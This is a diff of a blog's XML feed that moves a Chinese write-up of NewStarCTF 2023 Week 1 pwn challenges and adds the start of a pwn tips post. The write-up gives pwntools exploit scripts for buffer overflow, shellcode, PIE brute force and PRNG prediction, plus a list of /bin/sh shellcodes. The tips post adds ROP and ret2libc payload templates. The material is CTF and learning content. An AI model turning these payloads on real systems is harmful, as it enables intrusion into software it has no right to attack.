@@ -204,6 +204,74 @@
       </tags>
   </entry>
   <entry>
+    <title>NewStarCTF 2023 [WEEK 1] PWN</title>
+    <url>/NewStarCTF%202023%20%5BWEEK%201%5D%20PWN/</url>
+    <content><![CDATA[<p>NewStarCTF 2023 [WEEK 1] PWN</p>
+<span id="more"></span>
+
+<h1><span id="简介">简介：</span></h1><p>祝大家国庆节快乐，国庆就别再打 CTF 了，别卷了师傅们，玩玩吧！！！</p>
+<p>第一周的题目相对比较容易，pwn 没有 ak 有点可惜，伪随机的部分弄得还不是很清楚，需要加把油</p>
+<hr>
+<h2><span id="ret2text">ret2text</span></h2><p>一看题目就知道是经典栈溢出，老规矩查看保护机制，打开了栈不可执行 NX</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/1.png"></p>
+<p>IDA 查看反汇编，栈溢出很明显，并且还自带后门函数</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/2.png"></p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/3.png"></p>
+<p>最后再查看一下需要溢出多少字节的垃圾数据（一般情况下需要溢出的垃圾数据可以在 IDA 里面找到），gdb 调试一下，0x80 - 0x60 &#x3D; 0x20</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/4.png"></p>
+<p>直接攻击就行，exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26188</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">backdoor = <span class="number">0x4011FB</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(backdoor)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="ezshellcode">ezshellcode</span></h2><p>也是比较经典的 shellcode，开启 NX，往栈上写 shellcode 即可（但是需要注意的点就是 shellcode 的长度，根据题目来确定）</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/5.png"></p>
+<p>IDA 反汇编也比较明显，就是往 buf 里面写入 shellcode</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/6.png"></p>
+<p>exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29928</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>相关的 shellcode 如下，可以了解下！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 32位 短字节shellcode --&gt; 21字节</span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"> </span><br><span class="line"># 32位 纯ascii字符shellcode</span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"> </span><br><span class="line"># 32位 scanf可读取的shellcode</span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br><span class="line"> </span><br><span class="line"># 64位 scanf可读取的shellcode 22字节</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"># 64位 较短的shellcode  23字节</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"># 64位 纯ascii字符shellcode</span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="newstar-shop">newstar shop</span></h2><p>这道题就是一道整形溢出，需要认真的代码审计，当时做的的时候有点傻逼，脑子没有转过来一直在想 dont_try 一次只能一次扣 50，这样不可能使 money 达不到负数，忘记可以买东西了我真啥</p>
+<p>先看下 shop()，很明显自己的目的就是使直接赚够钱可以买到 shell，从而达到 <code>cat flag</code> 的目的</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/7.png"></p>
+<p>money 属于无符号整型，这里就要想办法溢出才能有足够的钱买 shell，如果单靠自己打工赚钱的话根本不可能，题目还设置了自己一天的工作时间，所以只有自己想办法溢出才是唯一的出路</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/8.png"></p>
+<p>题目还给参数设置了一些初始值，现在的任务就是使 money 变成负数就可以达到整型溢出</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/9.png"></p>
+<p><strong>思路如下：</strong>
+（直接 nc 连接，然后就是先买两次商品，最后 dont_try 扣一次钱，就能达到溢出的目的，再去买 shell，就可以直接拿下）</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/10.png"></p>
+<hr>
+<h2><span id="p1eee">p1eee</span></h2><p>查看保护机制，开启了 PIE 地址随机化，每次运行的基址都不一样，但是 PIE 不会随机化地址的低 12 位（也就是说后三位地址是固定的），所以可以采用 partial write，爆破倒数第四位，十六分之一的成功几率</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/11.png"></p>
+<p>IDA 反编译，存在栈溢出，并且有后门函数（因为开启了 PIE，地址的后三位不会变 <code>26c</code>，所以只需爆破倒数第四位）。由于小端序的原因，所以就是 <code>\x6c\x11</code>，后面 <code>\x11</code> 是随机的，可以改成别的，如下都行：</p>
+<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">l<span class="attr">ist</span> <span class="operator">=</span> [<span class="string">&quot;<span class="char escape_">\x</span>01&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>11&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>21&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>31&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>41&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>51&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>61&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>71&quot;</span>,</span><br><span class="line">        <span class="string">&quot;<span class="char escape_">\x</span>81&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>91&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>a1&quot;</span>, <span class="string">&quot;<span class="char escape_">\x</span>b1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>c1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>d1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>e1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>f1&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>但是需要转换（都是套路）</p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/12.png"></p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/13.png"></p>
+<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/14.png"></p>
+<p>接下来就是写脚本爆破了（脚本格式通用），exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28968</span>)</span><br><span class="line">        elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">         </span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p16(<span class="number">0x126c</span>)</span><br><span class="line">        </span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="random">Random</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26977</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"> </span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">num1 = libc.rand()</span><br><span class="line"> </span><br><span class="line">p.sendline(<span class="built_in">str</span>(num1))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1><span id="总结">总结：</span></h1><p>伪随机部分还相对薄弱，需要加把油，绕过 PIE 掌握的差不多了，加油，奥里给！！！</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>NewStarCTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MoeCTF 2023 PWN</title>
     <url>/MoeCTF%202023%20PWN/</url>
     <content><![CDATA[<p>MoeCTF 2023 PWN</p>
@@ -301,74 +369,6 @@
       <tags>
         <tag>PWN</tag>
         <tag>MoeCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NewStarCTF 2023 [WEEK 1] PWN</title>
-    <url>/NewStarCTF%202023%20%5BWEEK%201%5D%20PWN/</url>
-    <content><![CDATA[<p>NewStarCTF 2023 [WEEK 1] PWN</p>
-<span id="more"></span>
-
-<h1><span id="简介">简介：</span></h1><p>祝大家国庆节快乐，国庆就别再打 CTF 了，别卷了师傅们，玩玩吧！！！</p>
-<p>第一周的题目相对比较容易，pwn 没有 ak 有点可惜，伪随机的部分弄得还不是很清楚，需要加把油</p>
-<hr>
-<h2><span id="ret2text">ret2text</span></h2><p>一看题目就知道是经典栈溢出，老规矩查看保护机制，打开了栈不可执行 NX</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/1.png"></p>
-<p>IDA 查看反汇编，栈溢出很明显，并且还自带后门函数</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/2.png"></p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/3.png"></p>
-<p>最后再查看一下需要溢出多少字节的垃圾数据（一般情况下需要溢出的垃圾数据可以在 IDA 里面找到），gdb 调试一下，0x80 - 0x60 &#x3D; 0x20</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/4.png"></p>
-<p>直接攻击就行，exp 如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26188</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">backdoor = <span class="number">0x4011FB</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(backdoor)</span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="ezshellcode">ezshellcode</span></h2><p>也是比较经典的 shellcode，开启 NX，往栈上写 shellcode 即可（但是需要注意的点就是 shellcode 的长度，根据题目来确定）</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/5.png"></p>
-<p>IDA 反汇编也比较明显，就是往 buf 里面写入 shellcode</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/6.png"></p>
-<p>exp 如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29928</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line"> </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>相关的 shellcode 如下，可以了解下！！！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 32位 短字节shellcode --&gt; 21字节</span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"> </span><br><span class="line"># 32位 纯ascii字符shellcode</span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"> </span><br><span class="line"># 32位 scanf可读取的shellcode</span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br><span class="line"> </span><br><span class="line"># 64位 scanf可读取的shellcode 22字节</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"># 64位 较短的shellcode  23字节</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"># 64位 纯ascii字符shellcode</span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="newstar-shop">newstar shop</span></h2><p>这道题就是一道整形溢出，需要认真的代码审计，当时做的的时候有点傻逼，脑子没有转过来一直在想 dont_try 一次只能一次扣 50，这样不可能使 money 达不到负数，忘记可以买东西了我真啥</p>
-<p>先看下 shop()，很明显自己的目的就是使直接赚够钱可以买到 shell，从而达到 <code>cat flag</code> 的目的</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/7.png"></p>
-<p>money 属于无符号整型，这里就要想办法溢出才能有足够的钱买 shell，如果单靠自己打工赚钱的话根本不可能，题目还设置了自己一天的工作时间，所以只有自己想办法溢出才是唯一的出路</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/8.png"></p>
-<p>题目还给参数设置了一些初始值，现在的任务就是使 money 变成负数就可以达到整型溢出</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/9.png"></p>
-<p><strong>思路如下：</strong>
-（直接 nc 连接，然后就是先买两次商品，最后 dont_try 扣一次钱，就能达到溢出的目的，再去买 shell，就可以直接拿下）</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/10.png"></p>
-<hr>
-<h2><span id="p1eee">p1eee</span></h2><p>查看保护机制，开启了 PIE 地址随机化，每次运行的基址都不一样，但是 PIE 不会随机化地址的低 12 位（也就是说后三位地址是固定的），所以可以采用 partial write，爆破倒数第四位，十六分之一的成功几率</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/11.png"></p>
-<p>IDA 反编译，存在栈溢出，并且有后门函数（因为开启了 PIE，地址的后三位不会变 <code>26c</code>，所以只需爆破倒数第四位）。由于小端序的原因，所以就是 <code>\x6c\x11</code>，后面 <code>\x11</code> 是随机的，可以改成别的，如下都行：</p>
-<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">l<span class="attr">ist</span> <span class="operator">=</span> [<span class="string">&quot;<span class="char escape_">\x</span>01&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>11&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>21&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>31&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>41&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>51&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>61&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>71&quot;</span>,</span><br><span class="line">        <span class="string">&quot;<span class="char escape_">\x</span>81&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>91&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>a1&quot;</span>, <span class="string">&quot;<span class="char escape_">\x</span>b1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>c1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>d1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>e1&quot;</span>,<span class="string">&quot;<span class="char escape_">\x</span>f1&quot;</span>]</span><br></pre></td></tr></table></figure>
-
-<p>但是需要转换（都是套路）</p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/12.png"></p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/13.png"></p>
-<p><img src="/images/NewStarCTF2023%5BWEEK1%5DPWN/14.png"></p>
-<p>接下来就是写脚本爆破了（脚本格式通用），exp 如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28968</span>)</span><br><span class="line">        elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">         </span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p16(<span class="number">0x126c</span>)</span><br><span class="line">        </span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="random">Random</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26977</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"> </span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">num1 = libc.rand()</span><br><span class="line"> </span><br><span class="line">p.sendline(<span class="built_in">str</span>(num1))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h1><span id="总结">总结：</span></h1><p>伪随机部分还相对薄弱，需要加把油，绕过 PIE 掌握的差不多了，加油，奥里给！！！</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-        <tag>NewStarCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -491,6 +491,94 @@
       </tags>
   </entry>
   <entry>
+    <title>PWN PWN PWN !!! 技巧 (1)</title>
+    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/</url>
+    <content><![CDATA[<p>PWN PWN PWN !!! 技巧 (1)</p>
+<span id="more"></span>
+
+<h1><span id="简介">简介：</span></h1><p>记录一下，基础的知识点和一些工具的用法，解题模板等（本人记性差时不时会忘记，记录一下与大家共勉）</p>
+<hr>
+<h2><span id="32位传参">32位传参</span></h2><p>32位传参的方式是通过栈来传参的，与构造的payload也是有关的，大致如下：(有时候也会变根据题目意思来)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = 填充的数据 + system + 垃圾数据 + binsh</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="64位传参">64位传参</span></h2><p>64位传参前六个参数是通过寄存器来传参的，分别为 rdi、rsi、rdx、rcx、r8、r9，之后的参数是通过栈传递的，同样构造 payload 也有一套，但还是需要具体问题具体分析，大致如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = 填充的数据 + rdi + binsh + system</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="32位泄露libc之puts">32位泄露libc之puts</span></h2><p>这里只写构造 payload 的大体模板，其他的都是通式做多了就知道了（填充的数据是可以变的啊，main_addr 也就是你需要返回的地址）</p>
+<p><strong>第一次 payload 泄露 libc：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(main_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二次 payload 获得 shell：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="64位泄露libc之puts">64位泄露libc之puts</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二次 payload 得 shell：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="32位泄露libc之write">32位泄露libc之write</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二次 payload 获得 shell：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="64位泄露libc之write">64位泄露libc之write</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二次 payload 得 shell：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="泄露libc之有libc文件">泄露libc之有libc文件</span></h2><p>给 fresh pwner 提醒下，这里的 puts 是可以换的（看你是通过 puts 函数泄露的还是通过 write 函数泄露的，通过哪个写哪个）仔细观察有无 libc 文件的区别（发现没中小括号也是要区分的哦，可以自己试试）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="泄露libc之无libc文件">泄露libc之无libc文件</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="canary">Canary</span></h2><p><strong>第一次泄露 libc：</strong></p>
